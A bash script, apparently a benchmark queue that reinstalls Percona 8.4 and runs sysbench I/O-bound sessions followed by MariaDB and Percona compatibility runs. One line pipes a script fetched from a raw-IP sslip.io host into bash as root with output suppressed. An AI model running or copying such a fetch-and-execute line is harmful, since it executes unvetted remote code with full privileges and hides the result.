#!/bin/bash
# tuner-db3 (restart after the failed run): PS 8.4 back -> sysbench 20 GB uniform/special -> remaining compatibility versions
. /root/bench/queue-common.sh
set -x
curl -fsSL https://50-116-44-237.sslip.io/install.sh | bash >/dev/null; systemctl restart tuning-agent
/root/bench/compat.sh percona 8.4
grep -q "^8.4" <(mysql -N -e "SELECT VERSION()") || { echo "QUEUEFAILED: Percona 8.4 not running"; exit 1; }
tuning-agent baseline --apply
step /root/bench/prep-sysbench.sh 16 5200000
purge_binlogs; df -h / | tail -1
run_session /root/bench/sb20g-uniform.ini "sysbench 20 GB I/O-bound, uniform" tps 8
run_session /root/bench/sb20g-special.ini "sysbench 20 GB I/O-bound, special (skewed)" tps 8
echo QUEUEDONE
for fv in percona:9.7 mariadb:11.8 mariadb:12.3 mariadb:13.0; do /root/bench/compat.sh ${fv%%:*} ${fv##*:}; done
echo ALLCOMPATDONE > /root/bench/compat-all.done
